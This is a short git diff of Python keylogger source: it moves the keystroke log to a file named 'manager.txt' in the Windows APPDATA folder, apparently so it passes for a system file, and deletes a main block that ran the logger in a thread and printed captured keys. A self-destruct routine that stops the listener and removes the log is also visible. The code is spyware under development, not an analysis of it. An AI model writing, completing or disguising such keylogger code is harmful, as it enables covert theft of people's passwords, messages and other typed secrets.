@@ -6,8 +6,8 @@ import threading
 class Keylogger():
     keys = []
     count = 0
-    #path = os.environ['appdata'] + '\\manager.txt'
-    path = "processmanager.txt"
+    path = os.environ['appdata'] + '\\manager.txt'
+    #path = "processmanager.txt"
     flag = 0
 
     def on_press(self, key):
@@ -49,16 +49,3 @@ class Keylogger():
         self.flag = 1
         listener.stop()
         os.remove(self.path)
-
-
-
-if __name__ == '__main__':
-    keylogger = Keylogger()
-    thread = threading.Thread(target = keylogger.start)
-    thread.start()
-    while keylogger.flag != 1:
-        time.sleep(10)
-        logs = keylogger.read_keys()
-        print(logs)
-        #keylogger.destruct()
-    thread.join()
